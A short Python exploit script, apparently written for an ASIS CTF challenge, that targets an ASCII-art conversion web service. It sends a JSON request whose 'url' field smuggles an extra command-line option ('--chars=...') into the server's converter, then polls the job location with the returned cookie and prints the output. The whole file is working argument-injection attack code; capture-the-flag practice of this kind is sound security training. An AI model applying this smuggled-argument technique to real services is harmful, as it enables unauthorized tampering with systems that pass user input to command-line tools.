#!/usr/bin/env python3

import http.client
import sys
from string import Template
import json
import time

SERVER='asciiart.asisctf.com'
PORT=9000

def create(conn):
    method = 'POST'
    query = '/request'
    payload = {'url': ['https://images.all-free-download.com/images/graphiclarge/animal_pictures_08_hd_picture_168987.jpg', '--chars=.|/abcd']}
    payload = json.dumps(payload)
    headers = {
        "Content-Type": "application/json"
    }

    content_length = len(payload)
    basic_headers = {
        "Host": SERVER,
        "User-Agent": "curl/7.51.0",
        "Accept": "*/*",
        "Content-Length": str(content_length)
    }
    headers.update(basic_headers)

    conn.request(method, query, payload, headers)

    res = conn.getresponse()
    conn.close()
    return res

def get(conn, location, cookie):
    method = 'GET'
    query = location
    payload = ''
    headers = {
        'Cookie': cookie
    }

    content_length = len(payload)
    basic_headers = {
        "Host": SERVER,
        "User-Agent": "curl/7.51.0",
        "Accept": "*/*",
        "Content-Length": str(content_length)
    }
    headers.update(basic_headers)

    while True:
        conn.connect()
        conn.request(method, query, payload, headers)

        res = conn.getresponse()
        res = json.loads(res.read().decode())
        conn.close()
        if res['result'] != 'Processing...':
            break
        time.sleep(1)
    print(res)

def exploit(conn):
    res = create(conn)
    location = res.getheader('Location')
    cookie = res.getheader('Set-Cookie')
    print(location, cookie)
    get(conn, location, cookie)

if __name__=="__main__":
    try:
        conn = http.client.HTTPConnection(SERVER, PORT, timeout=10)
        conn.connect()
        exploit(conn)
        conn.close()
    except ConnectionRefusedError as err:
        print("Server: '{}' at port '{}' is refusing connection.".format(SERVER, PORT))


